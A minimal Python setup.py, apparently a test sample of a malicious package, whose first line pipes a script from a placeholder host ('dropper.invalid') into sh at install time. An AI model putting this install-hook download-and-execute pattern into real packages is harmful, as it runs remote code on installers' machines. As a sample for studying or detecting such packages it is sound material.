import os

os.system("curl http://dropper.invalid/x.sh | sh")

from setuptools import setup

setup(name="curl-pipe-sh", version="1.0.0")
